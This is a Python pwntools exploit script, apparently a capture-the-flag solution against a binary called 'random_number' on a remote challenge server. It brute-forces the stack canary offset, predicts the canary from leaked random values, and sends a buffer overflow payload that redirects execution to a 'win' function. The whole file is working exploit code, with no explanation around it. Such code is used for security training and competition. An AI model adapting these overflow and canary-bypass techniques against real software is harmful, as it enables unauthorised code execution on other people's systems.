#!/usr/bin/python3

from pwn import *
from subprocess import check_output

local = True
is_debug = False
filename = './random_number'
hostname = 'amt.rs'
port = 31175

elf = ELF(filename)
TIMEOUT = 1

def print_functions(elf):
    ''' Prints funtions and addresses '''
    for sym in elf.symbols:
        print(f"{sym}: {hex(elf.symbols[sym])}")


def print_gadgets(elf):
    ''' Prints all gadgets '''
    rop = ROP(elf)
    for gadget in rop.gadgets:
        print(rop.gadgets[gadget])


def get_process(_is_debug=is_debug):
    ''' Creates process '''
    if local:
        print(f'get_process({_is_debug})')
        if _is_debug:
            return gdb.debug(filename, '''
            break *random_guess+83
            continue
            ''')
        else:
            return process(filename)
    else:
        return remote(hostname, port)


def find_canary_offset():
    lcanary_offest = 8    
    while True:
        payload = b'A' * lcanary_offest
        proc = get_process()
        proc.recvuntil(b'3) Exit')
        proc.sendline(b'2')
        proc.sendlineafter(b'Enter in a number as your guess: ', payload)
        data = proc.recvall(timeout=TIMEOUT).decode()
        proc.close()
        if "Stack Smashing Detected" in data:
            return lcanary_offest - 1
        lcanary_offest += 1


# print_functions(elf)
# print_gadgets(elf)
win = elf.symbols['win']
print(f'win: {hex(win)}')
canary_offest = 44 # find_canary_offset()
offset = 56
print(f'canary_offest: {canary_offest}')
# Crash app first to ensure app initialized with new seed
payload = b'bullsh1t' * 100
proc = get_process(_is_debug = False)
proc.recvuntil(b'3) Exit')
proc.sendline(b'2')
proc.sendlineafter(b'Enter in a number as your guess: ', payload)
data = proc.recvall(timeout=TIMEOUT).decode()
proc.close()
# Now get 3 random numbers
proc = get_process()
proc.recvuntil(b'3) Exit')
proc.sendline(b'1')
num1 = proc.recvline()
num1 = proc.recvline()
proc.recvuntil(b'3) Exit')
proc.sendline(b'1')
num2 = proc.recvline()
num2 = proc.recvline()
proc.recvuntil(b'3) Exit')
proc.sendline(b'1')
num3 = proc.recvline()
num3 = proc.recvline()
# Get canary
command = ['./random', str(int(num1)), str(int(num2)), str(int(num3))]
guesser = process(command)
canary = int(guesser.recvall(timeout=TIMEOUT).decode())
print(f'Using canary {canary}')
payload = b'A' * canary_offest
payload += p32(canary)
payload += b'\x00' * (offset - canary_offest - 4)
payload += p64(win)
print(payload)
proc.recvuntil(b'3) Exit')
proc.sendline(b'2')
proc.sendlineafter(b'Enter in a number as your guess: ', payload)
data = proc.recvall(timeout=TIMEOUT).decode()
print(data)
proc.close()
